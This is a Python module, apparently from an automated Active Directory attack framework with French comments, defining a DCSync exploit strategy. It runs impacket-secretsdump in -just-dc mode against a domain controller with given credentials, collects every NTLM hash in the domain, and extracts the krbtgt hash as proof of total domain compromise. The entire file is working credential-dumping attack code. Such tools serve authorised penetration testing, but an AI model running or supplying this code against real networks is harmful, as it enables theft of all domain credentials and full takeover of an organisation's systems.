import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class DCSyncStrategy(ExploitStrategy):
    """
    DCSync — Réplication de l'annuaire AD.
    Dump tous les hashes NTLM du domaine incluant krbtgt.

    FIX:
    - Méthode principale : impacket-secretsdump -just-dc (fiable, pas de -outputfile)
    - Méthode bloodyAD supprimée : bloodyAD ne supporte pas le dump direct de unicodePwd
      via une commande unique — cette opération nécessite secretsdump.
    """

    def describe(self, edge: Edge) -> str:
        return (
            f"[DCSync] {edge.source_node.label} peut répliquer l'AD "
            f"→ dump de tous les hashes NTLM du domaine (krbtgt inclus)"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        return self._run_secretsdump(username, password, domain, dc_ip)

    # ── helper ───────────────────────────────────────────────────────────────

    def _run_secretsdump(self, username: str, password: str, domain: str, dc_ip: str) -> dict:
        # FIX: pas de -outputfile → stdout contient tous les hashes
        # -just-dc = mode DCSync uniquement (pas de dump SAM/LSA)
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr

            # Format : domaine\user:RID:LMhash:NThash:::
            hashes = [
                line.strip()
                for line in output.splitlines()
                if ":::" in line and not line.startswith("[")
            ]

            # krbtgt = preuve de compromission totale du domaine
            krbtgt_hash = next(
                (h for h in hashes if "krbtgt" in h.lower()),
                None,
            )

            success = krbtgt_hash is not None

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":        "dcsync",
                    "method":      "secretsdump -just-dc",
                    "krbtgt_hash": krbtgt_hash,
                    "all_hashes":  hashes,
                } if success else None,
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout (60s)", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}